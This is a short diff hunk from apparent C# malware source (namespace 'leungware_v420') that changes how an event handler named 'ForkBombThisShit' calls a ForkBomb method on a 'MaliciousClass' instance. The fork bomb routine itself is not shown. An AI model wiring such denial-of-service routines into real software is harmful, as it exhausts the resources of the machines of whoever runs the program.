@@ -39,7 +39,7 @@ namespace leungware_v420
         private void ForkBombThisShit(object sender, EventArgs e)
         {
             var inst = new MaliciousClass();
-            inst.ForkBomb(true);
+            inst.ForkBomb();
         }
     }
 }
